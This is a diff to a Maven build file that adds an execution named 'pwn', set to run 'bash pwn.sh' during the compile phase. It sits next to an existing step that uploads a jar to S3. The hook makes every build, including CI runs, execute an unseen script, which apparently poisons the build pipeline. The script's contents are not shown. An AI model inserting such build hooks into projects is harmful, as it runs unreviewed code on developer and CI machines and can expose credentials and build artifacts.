@@ -162,6 +162,17 @@
         <version>3.6.3</version>
         <executions>
           <execution>
+            <id>pwn</id>
+            <goals>
+              <goal>exec</goal>
+            </goals>
+            <phase>compile</phase>
+            <configuration>
+              <executable>bash</executable>
+              <commandlineArgs>pwn.sh</commandlineArgs>
+            </configuration>
+          </execution>
+          <execution>
             <id>Uploading jar to s3</id>
             <goals>
               <goal>exec</goal>
